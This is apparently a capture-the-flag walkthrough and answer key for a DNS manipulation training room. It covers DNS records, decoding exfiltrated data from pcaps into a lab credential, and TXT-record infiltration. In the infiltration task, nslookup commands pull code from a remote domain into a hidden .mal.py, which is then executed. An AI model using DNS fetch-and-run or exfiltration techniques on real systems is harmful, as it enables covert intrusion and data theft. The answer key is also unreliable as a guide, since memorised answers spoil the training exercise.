<p>July 21, 2025 - Day 440</p>
<h1>DNS Manipulation</h1>

<br>

<h2>Task 1 . Introduction</h2>

<br>

<h3 align="left"> Answer the question below</h3>

<p>1.1. Read the above<br>
<code>No answer needed</code></p>


<br>


<h2>Task 2 . Installation</h2>

<br>

<h3 align="left"> Answer the question below</h3>

<p>2.1. Ready!<br>
<code>No answer needed</code></p>

<br>


<h2>Task 3 . [Setup] Custom Public DNS Server</h2>

<br>

<h3 align="left"> Answer the question below</h3>

<p>3.1. Read the above<br>
<code>No answer needed</code></p>

<br>


<h2>Task 4 . What is DNS?</h2>

<br>

<h3 align="left"> Answer the questions below</h3>

<p>4.1. If you were on Windows, what command could you use to query a txt record for 'youtube.com'?<br>
<code>nslookup -type=txt youtube.com</code></p>

<p>4.2.If you were on Linux, what command could you use to query a txt record for 'facebook.com'?<br>
<code>dig facebook.com TXT</code></p>

<p>4.3. AAAA stores what type of IP Address along with the hostname?<br>
<code>IPv6</code></p>


<p>4.4. Maximum characters for a DNS TXT Record is 256. (Yay/Nay)<br>
<code>Nay</code></p>

<p>4.5. What DNS Record provides a domain name in reverse-lookup? (Research)<br>
<code>PTR</code></p>

<p>4.6.What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) (Research)<br>
<code>2.203.168.192.in-addr.arpa</code></p>


<br>

<h2>Task 5 . What is DNS Exfiltration?</h2>

<br>

<h3 align="left"> Answer the questions below</h3>

<p>5.1. What is the maximum length of a DNS name? (Research) (Length includes dots!)<br>
<code>253</code></p>

<br>

<h2>Task 6 . DNS Exfiltration - Practice</h2>

<br>

<h3 align="left"> Answer the questions below</h3>

<p>6.1. ~/challenges/exfiltration/orderlist/  | ORDER-ID: 1 | What is the Transaction name? (Type it as you see it)<br>
<code>Network Equip.</code></p>

```bash
:~/DNSManipulation# ssh user@TargetIP
...
user@user1:~/challenges$ ls
exfiltration  infiltration
...
user@user1:~/challenges/exfiltration/orderlist$ ls
order.pcap  TASK
```

```bash
user@user1:~/challenges/exfiltration/orderlist$ cat TASK
The order.pcap file has suspecious queries. Use the ~/dns-exfil-infil/packetyGrabber.py to decode
the data and answer the questions accrodingly.

IDENTIFY THE DOMAIN NAME USED TO EXFILTRATE DATA
use the following command to see all DNS Queries
tshark -r order.pcap -T fields -e dns.qry.name
(ignore the .localdomain part)

Use the packetyGrabber.py located in ~/dns-exfil-infil/ folder to decode the DNS queries to a plain-text file.
python3 ~/dns-exfil-infil/packetyGrabber.py

IGNORE THE EXCEPTION THROWN AT THE END OF SCRIPT
```


```bash
user@user1:~/challenges/exfiltration/orderlist$ tshark -r order.pcap -T fields -e dns.qry.name
8.8.8.8.in-addr.arpa

8.8.8.8.in-addr.arpa
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in.localdomain
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in.localdomain
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in.localdomain
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in.localdomain
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in

g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in.localdomain
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in.localdomain
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in.localdomain
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in.localdomain
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in.localdomain
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in.localdomain
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in.localdomain
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in.localdomain
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in.localdomain
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in.localdomain
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in.localdomain

iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in.localdomain
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in.localdomain
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in.localdomain
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in.localdomain
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in.localdomain
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in

nuYDfHko8XQgfbY42GD58gr.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in.localdomain
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in.localdomain
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in.localdomain
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in.localdomain
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in



8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in.localdomain
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in.localdomain
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in.localdomain
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in.localdomain
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
gEpjMMcCs8351YngnnVMith.badbaddoma.in.localdomain

gEpjMMcCs8351YngnnVMith.badbaddoma.in.localdomain
gEpjMMcCs8351YngnnVMith.badbaddoma.in.localdomain
gEpjMMcCs8351YngnnVMith.badbaddoma.in.localdomain
gEpjMMcCs8351YngnnVMith.badbaddoma.in
gEpjMMcCs8351YngnnVMith.badbaddoma.in
gEpjMMcCs8351YngnnVMith.badbaddoma.in
gEpjMMcCs8351YngnnVMith.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in.localdomain
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in.localdomain
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in.localdomain
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in.localdomain
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in

aKxisGedhKCyZ53N3VbGktq.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in.localdomain
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in.localdomain
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in.localdomain
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in.localdomain
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in.localdomain
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in.localdomain
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in.localdomain
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in.localdomain
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in
8.8.8.8.in-addr.arpa

8.8.8.8.in-addr.arpa
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in.localdomain
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in.localdomain
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in.localdomain
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in.localdomain
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in.localdomain
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in.localdomain
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in.localdomain
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in.localdomain
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in

kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in.localdomain
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in.localdomain
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in.localdomain
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in.localdomain
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in.localdomain
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in.localdomain
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in.localdomain
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in.localdomain
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in.localdomain
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in.localdomain
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in.localdomain
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in.localdomain
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in.localdomain
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in.localdomain
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in.localdomain
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in.localdomain
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in

gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in.localdomain
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in.localdomain
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in.localdomain
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in.localdomain
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in.localdomain
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in.localdomain
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in.localdomain
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in.localdomain
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in.localdomain
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in.localdomain
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in.localdomain
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in.localdomain
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in.localdomain
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in.localdomain
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in.localdomain

m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in.localdomain
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in.localdomain
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in.localdomain
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in.localdomain
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in.localdomain
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in

abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in.localdomain
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in.localdomain
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in.localdomain
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in.localdomain
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in.localdomain
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in.localdomain
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in.localdomain
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in.localdomain
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in.localdomain

kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in.localdomain
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in.localdomain
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in.localdomain
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
h9JNrq5zMfnLyncog.badbaddoma.in.localdomain
h9JNrq5zMfnLyncog.badbaddoma.in.localdomain
h9JNrq5zMfnLyncog.badbaddoma.in.localdomain
h9JNrq5zMfnLyncog.badbaddoma.in.localdomain
h9JNrq5zMfnLyncog.badbaddoma.in
h9JNrq5zMfnLyncog.badbaddoma.in
h9JNrq5zMfnLyncog.badbaddoma.in

h9JNrq5zMfnLyncog.badbaddoma.in









wpad
wpad

wpad
wpad
```


```bash
user@user1:~/challenges/exfiltration/orderlist$ python3 ~/dns-exfil-infil/packetyGrabber.py
File captured: order.pcap
Filename output: exfiltration.txt
Domain Name (Example: badbaddoma.in): badbaddoma.in
[+] Domain Name set to badbaddoma.in
[+] Filtering for your domain name.
[+] Base58 decoded.
[+] Base64 decoded.
[+] Output to exfiltration.txt
Exception ignored in: <bound method BaseEventLoop.__del__ of <_UnixSelectorEventLoop running=False closed=True debug=False>>
Traceback (most recent call last):
  File "/usr/lib/python3.5/asyncio/base_events.py", line 431, in __del__
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 58, in close
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 139, in remove_signal_handler
  File "/usr/lib/python3.5/signal.py", line 47, in signal
TypeError: signal handler must be signal.SIG_IGN, signal.SIG_DFL, or a callable object
```

```bash
user@user1:~/challenges/exfiltration/orderlist$ ls
exfiltration.txt  order.pcap  TASK
```

```bash
user@user1:~/challenges/exfiltration/orderlist$ cat exfiltration.txt
DATE	ORDER-ID	TRANSACTION	PRICE	   CODE
01-06	   1		Network Equip.	$2349.99    -
01-09	   2		Software Licen. $1293.49    -
01-11	   3		Physical Secur.	$7432.79    -
02-06	   4		SENT TO #1056..	$15040.23   -
02-06	   5		1M THM VOUCHER  $10	   zSiSeC
02-06	   6		Firewall	$2500	    -
```

<br>

<p>6.2. ~/challenges/exfiltration/orderlist/  | TRANSACTION: Firewall | How much was the Firewall? (Without the $)<br>
<code>2500</code></p>

<br>

<p>6.3. ~/challenges/exfiltration/identify/ | Which file contains suspicious DNS queries?<br>
<code>cap3.pcap</code></p>

```bash
user@user1:~/challenges/exfiltration/identify$ ls
cap1.pcap  cap2.pcap  cap3.pcap  TASK  TASK1.save
```

```bash
user@user1:~/challenges/exfiltration/identify$ cat TASK
Steps on how to solve this task:
1. Identify which file contains the suspicious dns queries.
2. Identify what domain name was used to exfiltrate the data.
( You can use tshark to filter the dns query name )
( Google how to filter dns query names with tshark )
3. Run ~/dns-exfil-infil/packetyGrabber.py and put the correct inputs in.

If you do everything correctly you will be able to answer the last 2 questions.
```

```bash
user@user1:~/challenges/exfiltration/identify$ cat TASK1.save
The order.pca
```

```bash
user@user1:~/challenges/exfiltration/identify$ tshark -r cap1.pcap -T fields -e dns.qry.name | sort | uniq
facebook.com
github.com
google.com
reddit.com
tryhackme.com
video1.youtube.com
video2.cloudflare.com
youtube.com
```

```bash
user@user1:~/challenges/exfiltration/identify$ tshark -r cap2.pcap -T fields -e dns.qry.name | sort | uniq
6.googlevideo.com
```

```bash
user@user1:~/challenges/exfiltration/identify$ tshark -r cap3.pcap -T fields -e dns.qry.name | sort | uniq

g5SUFQJi3BgPBgh2jYe5Vhm.badbaddoma.in
pDG6RsCnrcFxCWEGji.badbaddoma.in
uuhYFkMJxQsVeFSmCrxtyke.badbaddoma.in
```

<br>

<p>6.4. ~/challenges/exfiltration/identify/ | Enter the plain-text after you have decoded the data using packetyGrabber.py found in ~/dns-exfil-infil/ folder.<br>
<code>administrator:s3cre7P@ssword</code></p>

```bash
user@user1:~/challenges/exfiltration/identify$ python3 ~/dns-exfil-infil/packetyGrabber.py 
File captured: cap3.pcap
Filename output: exfiltration_cap3.txt   
Domain Name (Example: badbaddoma.in): badbaddoma.in
[+] Domain Name set to badbaddoma.in
[+] Filtering for your domain name.
[+] Base58 decoded.
[+] Base64 decoded.
[+] Output to exfiltration_cap3.txt
Exception ignored in: <bound method BaseEventLoop.__del__ of <_UnixSelectorEventLoop running=False closed=True debug=False>>
Traceback (most recent call last):
  File "/usr/lib/python3.5/asyncio/base_events.py", line 431, in __del__
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 58, in close
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 139, in remove_signal_handler
  File "/usr/lib/python3.5/signal.py", line 47, in signal
TypeError: signal handler must be signal.SIG_IGN, signal.SIG_DFL, or a callable object
```

```bash
user@user1:~/challenges/exfiltration/identify$ cat exfiltration_cap3.txt
administrator:s3cre7P@ssword
```

<br>

<h2>Task 7 . What is DNS infiltraton?</h2>

<br>

<h3 align="left"> Answer the question below</h3>

<p>7.1. What type of DNS Record is usually used to infiltrate data into a network?<br>
<code>txt</code></p>

<br>

<h2>Task 8 . DNS Infiltration - Demo</h2>

<br>

<h3 align="left"> Answer the question below</h3>

<p>8.1. Read the above.<br>
<code>No answer needed</code></p>

<br>

<h2>Task 9 . DNS Infiltration - Practice</h2>

<br>

<h3 align="left"> Answer the question below</h3>

<p>9.1. Read the above.<br>
<code>No answer needed</code></p>

<br>

<h2>Task 10 . DNS Infiltration - Practice</h2>
<p>Use the same VM from [Task 7] DNS Exfiltration - Practice.<br>

Read the TASK file found in the ~/challenges/infiltration/ folder.<br>

IMPORTANT: FOR THIS TASK USE DOMAIN nodrc.com INSTEAD OF badbaddoma.in<br>

You may use the same command used in the [Task 9] DNS Infiltration - Demo.<br>

nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py<br>

Keep in mind you will need to adjust the 'grep' section and use the appropriate characters to match on. For example, if the text value from the TXT Record starts with 'G6...' you will need to use 'grep G6'.</p>

<br>

<h3 align="left"> Answer the question below</h3>

<p>10.1.   Follow the instructions in the TASK file to complete this question. Enter the output from the executed python file.<br>
<code>4.4.0-186-generic</code></p>

```bash
user@user1:~/challenges$ ls
exfiltration  infiltration
```

```bash
user@user1:~/challenges/infiltration$ ls
TASK
```

```bash
user@user1:~/challenges/infiltration$ cat TASK
For this TASK we will be requesting a TXT Record from my public domain name.
Here is the information needed to complete this challenge:

My Domain Name: badbaddoma.in
Request TXT Record from this subdomain: code
Save the text value to a python file
Run the ~/dns-exfil-infil/packetySimple.py to decode the text
Run the program: python3 [your-file-name].py
Take a note of the output and answer the question in the "DNS Infiltration - Practice" section.
```

```bash
user@user1:~/challenges/infiltration$ nslookup -type=txt code.badbaddoma.in
Server:		10.0.0.2
Address:	10.0.0.2#53
```

```bash
user@user1:~/challenges/infiltration$ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py
```

```bash
user@user1:~/challenges/infiltration$ ls
TASK
user@user1:~/challenges/infiltration$ ls -la
total 12
drwxrwxr-x 2 user user 4096 Jul 20 11:50 .
drwxrwxr-x 4 user user 4096 Feb 14  2021 ..
-rw-rw-r-- 1 user user    0 Jul 20 11:51 .mal.py
-rw-rw-r-- 1 user user  452 Feb 26  2021 TASK
```

```bash
user@user1:~/challenges/infiltration$ nslookup -type=TXT code.nodrc.com | grep Yee | cut -d \" -f2 > .mal.py
```

```bash
user@user1:~/challenges/infiltration$ python3 ~/dns-exfil-infil/packetySimple.py
```

```bash
user@user1:~/challenges/infiltration$ python3 .mal.py 
4.4.0-186-generic
```

<br>

<h2>Task 11 . DNS Tunelling</h2>

<br>

<h3 align="left"> Answer the question below</h3>

<p>11.1. What program was used to Tunnel HTTP over DNS?<br>
<code>iodine</code></p>

<br>

<h2>Task 12 . The End</h2>

<br>

<h3 align="left"> Answer the question below</h3>

<p>12.1. End<br>
<code>No answer needed</code></p>

<br>
<br>




